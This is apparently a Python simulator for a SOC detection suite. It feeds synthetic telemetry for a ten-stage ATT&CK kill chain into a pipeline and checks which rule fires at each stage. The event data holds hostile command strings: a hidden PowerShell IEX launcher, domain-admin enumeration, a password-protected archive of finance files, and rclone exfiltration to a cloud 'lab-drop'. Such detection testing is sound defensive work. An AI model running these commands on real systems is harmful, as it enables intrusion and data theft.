"""
End-to-End Multi-Stage Adversary Attack Chain Simulator for CyberPulse SOC Suite
Emulates a ten-stage intrusion, initial access to exfiltration and impact (roadmap F28),
and checks that each stage is detected by the rule expected for it.

*** LAB USE ONLY ***
Never run this against production systems or networks you do not own or are not
explicitly authorised to test. It only emits synthetic telemetry (no exploitation,
no credential access, no network traffic). Every event is built in memory, tagged
simulation=true and fed to the pipeline; nothing is executed.

    CYBERPULSE_LAB_MODE=true python simulator/attack_chain.py
"""

import os
import sys
import time
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from simulator.attack_simulator import (  # noqa: E402
    simulate_t1003_lsass_dump,
    simulate_t1053_scheduled_task,
    simulate_t1059_powershell_execution,
    simulate_t1486_ransomware_canary,
    simulate_t1562_defender_tamper,
)
from simulator.lab_guard import lab_only  # noqa: E402
from soar.soar_engine import SOAROrchestrator  # noqa: E402

SYSMON = "Microsoft-Windows-Sysmon/Operational"
FOOTHOLD = "WIN-WORKSTATION09"
PIVOT = "CORP-FINANCE-02"
STAGE_GAP = timedelta(minutes=4)


def _process(host, technique, name, image, command, parent):
    return {
        "event_id": 1, "event_source": SYSMON, "technique_id": technique, "technique_name": name,
        "computer_name": host, "user": "CORP\\j.doe", "source_ip": "10.0.2.15", "simulation": True,
        "details": {"Image": image, "CommandLine": command, "ParentImage": parent},
    }


@lab_only
def initial_access_macro():
    return _process(FOOTHOLD, "T1566.001", "Phishing: Spearphishing Attachment",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell -nop -w hidden -c IEX(stage1)",
                    "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")


@lab_only
def discovery_domain_admins():
    return _process(FOOTHOLD, "T1087.002", "Account Discovery: Domain Account",
                    "C:\\Windows\\System32\\net.exe", 'net group "domain admins" /domain',
                    "C:\\Windows\\System32\\cmd.exe")


@lab_only
def lateral_movement_service():
    return _process(PIVOT, "T1021.002", "Remote Services: SMB/Windows Admin Shares",
                    "C:\\Windows\\System32\\cmd.exe", "cmd.exe", "C:\\Windows\\PSEXESVC.exe")


@lab_only
def collection_archive():
    return _process(PIVOT, "T1560.001", "Archive Collected Data: Archive via Utility",
                    "C:\\Program Files\\7-Zip\\7z.exe",
                    "7z.exe a -pLabOnly -mhe=on C:\\Users\\Public\\q4.7z D:\\Finance\\*",
                    "C:\\Windows\\System32\\cmd.exe")


@lab_only
def exfiltration_cloud_storage():
    return _process(PIVOT, "T1567.002", "Exfiltration Over Web Service: to Cloud Storage",
                    "C:\\Users\\Public\\rclone.exe", "rclone.exe copy C:\\Users\\Public\\q4.7z mega:lab-drop -q",
                    "C:\\Windows\\System32\\cmd.exe")


KILL_CHAIN_STAGES = [
    {"phase": "1. Initial access (macro document)", "tactic": "Initial Access", "technique": "T1566.001",
     "expected_rule": "SOC-RULE-021", "generator": initial_access_macro},
    {"phase": "2. Execution (encoded PowerShell)", "tactic": "Execution", "technique": "T1059.001",
     "expected_rule": "SOC-RULE-004", "generator": simulate_t1059_powershell_execution},
    {"phase": "3. Defense evasion (Defender tamper)", "tactic": "Defense Evasion", "technique": "T1562.001",
     "expected_rule": "SOC-RULE-005", "generator": simulate_t1562_defender_tamper},
    {"phase": "4. Discovery (domain admins)", "tactic": "Discovery", "technique": "T1087.002",
     "expected_rule": "SOC-RULE-034", "generator": discovery_domain_admins},
    {"phase": "5. Credential access (LSASS)", "tactic": "Credential Access", "technique": "T1003.001",
     "expected_rule": "SOC-RULE-001", "generator": simulate_t1003_lsass_dump},
    {"phase": "6. Lateral movement (service execution)", "tactic": "Lateral Movement", "technique": "T1021.002",
     "expected_rule": "SOC-RULE-035", "generator": lateral_movement_service},
    {"phase": "7. Persistence (scheduled task)", "tactic": "Persistence", "technique": "T1053.005",
     "expected_rule": "SOC-RULE-003", "generator": simulate_t1053_scheduled_task},
    {"phase": "8. Collection (encrypted archive)", "tactic": "Collection", "technique": "T1560.001",
     "expected_rule": "SOC-RULE-038", "generator": collection_archive},
    {"phase": "9. Exfiltration (cloud storage)", "tactic": "Exfiltration", "technique": "T1567.002",
     "expected_rule": "SOC-RULE-039", "generator": exfiltration_cloud_storage},
    {"phase": "10. Impact (ransomware canary)", "tactic": "Impact", "technique": "T1486",
     "expected_rule": "SOC-RULE-006", "generator": simulate_t1486_ransomware_canary},
]


def run_chain(orchestrator=None, start=None, delay_between_phases=0.0, webhook_url=None):
    """Feed every stage to the pipeline in order, with event times STAGE_GAP apart. Returns one row per stage."""
    orchestrator = orchestrator or SOAROrchestrator(webhook_url=webhook_url)
    start = start or datetime(2026, 11, 1, 9, 0, tzinfo=timezone.utc)
    results = []
    for i, stage in enumerate(KILL_CHAIN_STAGES):
        event = stage["generator"]()
        event["timestamp"] = (start + i * STAGE_GAP).isoformat()
        alert = orchestrator.process_event(event, custom_webhook_url=webhook_url)
        rule = (alert or {}).get("rule") or {}
        matched = [rule.get("rule_id")] + list(rule.get("also_matched", [])) if alert else []
        action = (alert or {}).get("containment_action") or {}
        results.append({
            "stage": stage["phase"], "tactic": stage["tactic"], "technique_id": stage["technique"],
            "event_time": event["timestamp"], "host": event.get("computer_name"),
            "expected_rule": stage["expected_rule"], "rule_id": rule.get("rule_id"),
            "detected": stage["expected_rule"] in matched,
            # Report what the pipeline actually did; under the default policy that is a proposal
            "containment_status": action.get("status", "NONE"), "action_type": action.get("action_type", "NONE"),
            "latency_sec": (alert or {}).get("pipeline_timing", {}).get("total_pipeline_sec"),
        })
        if delay_between_phases:
            time.sleep(delay_between_phases)
    return results


def run_adversary_kill_chain(delay_between_phases=1.5, webhook_url=None):
    """Console runner kept for the existing CLI entry point."""
    results = run_chain(delay_between_phases=delay_between_phases, webhook_url=webhook_url)
    print("\n" + "=" * 80)
    print(f" EMULATED KILL CHAIN ({len(results)} stages, synthetic telemetry only)")
    print("=" * 80)
    for r in results:
        if not r["detected"]:
            verdict = f"MISSED (got {r['rule_id']})"
        elif r["rule_id"] == r["expected_rule"]:
            verdict = f"DETECTED by {r['rule_id']}"
        else:
            verdict = f"DETECTED by {r['expected_rule']} (top: {r['rule_id']})"
        print(f"  {r['stage']:<44} {r['technique_id']:<10} {verdict:<42} {r['containment_status']}")
    print(f"\n  {sum(r['detected'] for r in results)}/{len(results)} stages detected by the expected rule")
    return results


if __name__ == "__main__":
    from simulator.lab_guard import LabModeRequired
    try:
        run_adversary_kill_chain(delay_between_phases=0)
    except LabModeRequired as exc:
        sys.exit(str(exc))
